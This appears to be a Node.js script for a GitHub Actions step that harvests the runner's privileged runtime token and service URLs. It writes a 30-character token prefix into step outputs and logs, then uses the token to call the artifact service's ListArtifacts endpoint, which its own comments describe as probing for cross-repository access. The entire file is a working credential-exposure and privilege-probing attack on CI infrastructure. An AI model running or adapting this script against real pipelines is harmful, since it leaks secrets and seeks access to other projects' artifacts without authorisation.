const https = require('https');
const http = require('http');

// Read privileged env vars only available in node action context
const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';

// Write to GITHUB_OUTPUT for subsequent steps
const fs = require('fs');
const outputFile = process.env.GITHUB_OUTPUT || '';
if (outputFile) {
  fs.appendFileSync(outputFile, `RESULTS_URL=${RESULTS_URL}\n`);
  fs.appendFileSync(outputFile, `CACHE_URL=${CACHE_URL}\n`);
  fs.appendFileSync(outputFile, `TOKEN_PRESENT=${RUNTIME_TOKEN ? 'YES' : 'NO'}\n`);
  fs.appendFileSync(outputFile, `TOKEN_PREFIX=${RUNTIME_TOKEN.substring(0, 30)}\n`);
}

// Log what we found
console.log('RESULTS_URL:', RESULTS_URL ? RESULTS_URL.substring(0, 80) : '(empty)');
console.log('CACHE_URL:', CACHE_URL ? CACHE_URL.substring(0, 80) : '(empty)');
console.log('TOKEN_PRESENT:', RUNTIME_TOKEN ? 'YES' : 'NO');
console.log('TOKEN_PREFIX:', RUNTIME_TOKEN.substring(0, 30));

// If RESULTS_URL is available, probe the artifact service for cross-repo access
if (RESULTS_URL) {
  console.log('=== Probing artifact service for cross-repo listing ===');
  const url = new URL(RESULTS_URL + 'twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts');
  const options = {
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Authorization': 'Bearer ' + RUNTIME_TOKEN,
      'Content-Type': 'application/json',
    }
  };
  
  const req = https.request(options, (res) => {
    console.log('ListArtifacts status:', res.statusCode);
    let data = '';
    res.on('data', (chunk) => data += chunk);
    res.on('end', () => {
      console.log('ListArtifacts response:', data.substring(0, 500));
    });
  });
  req.on('error', (e) => console.log('Request error:', e.message));
  req.write('{}');
  req.end();
} else {
  console.log('No RESULTS_URL available from action env');
}
